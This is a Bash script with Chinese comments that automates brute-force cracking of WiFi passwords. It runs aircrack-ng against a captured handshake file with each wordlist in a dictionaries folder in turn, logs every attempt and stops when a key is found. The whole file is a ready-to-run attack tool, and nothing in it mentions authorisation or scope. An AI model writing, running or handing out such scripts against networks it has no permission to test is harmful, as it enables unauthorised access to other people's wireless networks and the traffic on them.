#!/bin/bash

# 批量WiFi密码暴力破解脚本
# 使用方法: sudo ./batch_crack.sh [cap文件]

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# 检查是否以root权限运行
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}错误: 请使用sudo运行此脚本${NC}"
    echo "使用方法: sudo ./batch_crack.sh"
    exit 1
fi

# 检查aircrack-ng是否安装
if ! command -v aircrack-ng &> /dev/null; then
    echo -e "${RED}错误: 未找到aircrack-ng，请先安装${NC}"
    echo "macOS安装命令: brew install aircrack-ng"
    exit 1
fi

# 默认cap文件
CAP_FILE="work-01.cap"

# 如果提供了参数，使用提供的参数
if [ $# -ge 1 ]; then
    CAP_FILE="$1"
fi

# 检查cap文件是否存在
if [ ! -f "$CAP_FILE" ]; then
    echo -e "${RED}错误: 找不到cap文件 '$CAP_FILE'${NC}"
    echo "可用的cap文件:"
    ls -la *.cap 2>/dev/null || echo "当前目录没有cap文件"
    exit 1
fi

# 字典文件夹
DICT_DIR="dictionaries"

# 检查字典文件夹是否存在
if [ ! -d "$DICT_DIR" ]; then
    echo -e "${RED}错误: 字典文件夹 '$DICT_DIR' 不存在${NC}"
    echo "请创建 $DICT_DIR 文件夹并放入字典文件"
    exit 1
fi

# 自动获取字典文件夹中的所有字典文件
WORDLISTS=($(ls "$DICT_DIR"/*.txt 2>/dev/null | sort))

if [ ${#WORDLISTS[@]} -eq 0 ]; then
    echo -e "${RED}错误: 字典文件夹 '$DICT_DIR' 中没有找到字典文件${NC}"
    echo "请将字典文件（.txt格式）放入 $DICT_DIR 文件夹"
    exit 1
fi

echo -e "${BLUE}=== 批量WiFi密码暴力破解工具 ===${NC}"
echo -e "${YELLOW}目标文件: ${CAP_FILE}${NC}"
echo -e "${YELLOW}开始时间: $(date)${NC}"
echo ""

# 显示cap文件信息
echo -e "${BLUE}分析cap文件...${NC}"
aircrack-ng "$CAP_FILE"

echo ""
echo -e "${PURPLE}将按以下顺序尝试字典文件:${NC}"
for i in "${!WORDLISTS[@]}"; do
    dict_name=$(basename "${WORDLISTS[$i]}")
    echo -e "${YELLOW}$((i+1)). $dict_name${NC}"
done
echo ""

# 创建结果目录
RESULTS_DIR="crack_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

# 记录开始时间
START_TIME=$(date +%s)

# 逐个尝试字典文件
for wordlist in "${WORDLISTS[@]}"; do
    dict_name=$(basename "$wordlist")
    
    echo -e "${BLUE}========================================${NC}"
    echo -e "${GREEN}正在尝试字典: $dict_name${NC}"
    echo -e "${YELLOW}当前时间: $(date)${NC}"
    echo -e "${BLUE}========================================${NC}"
    
    # 创建日志文件
    LOG_FILE="$RESULTS_DIR/crack_${dict_name%.txt}.log"
    
    # 开始破解并记录输出
    echo "开始破解 $CAP_FILE 使用字典 $dict_name" > "$LOG_FILE"
    echo "开始时间: $(date)" >> "$LOG_FILE"
    echo "========================================" >> "$LOG_FILE"
    
    # 运行aircrack-ng并捕获输出
    aircrack-ng "$CAP_FILE" -w "$wordlist" 2>&1 | tee -a "$LOG_FILE"
    EXIT_CODE=${PIPESTATUS[0]}
    
    # 检查日志文件中是否包含"KEY NOT FOUND"
    if grep -q "KEY NOT FOUND" "$LOG_FILE"; then
        echo -e "${RED}字典 $dict_name 未找到密码${NC}"
        echo "未找到密码" >> "$LOG_FILE"
        echo "结束时间: $(date)" >> "$LOG_FILE"
    else
        echo -e "${GREEN}破解成功！密码可能在字典 $dict_name 中找到${NC}"
        echo "破解成功！" >> "$LOG_FILE"
        echo "结束时间: $(date)" >> "$LOG_FILE"
        
        # 计算耗时
        END_TIME=$(date +%s)
        DURATION=$((END_TIME - START_TIME))
        echo -e "${GREEN}总耗时: ${DURATION} 秒${NC}"
        echo "总耗时: ${DURATION} 秒" >> "$LOG_FILE"
        
        break
    fi
    
    echo ""
done

echo ""
echo -e "${BLUE}=== 批量破解完成 ===${NC}"
echo -e "${YELLOW}结果保存在目录: $RESULTS_DIR${NC}"
echo -e "${YELLOW}结束时间: $(date)${NC}"

# 显示结果摘要
echo ""
echo -e "${PURPLE}=== 破解结果摘要 ===${NC}"
if [ -d "$RESULTS_DIR" ]; then
    ls -la "$RESULTS_DIR"/
fi 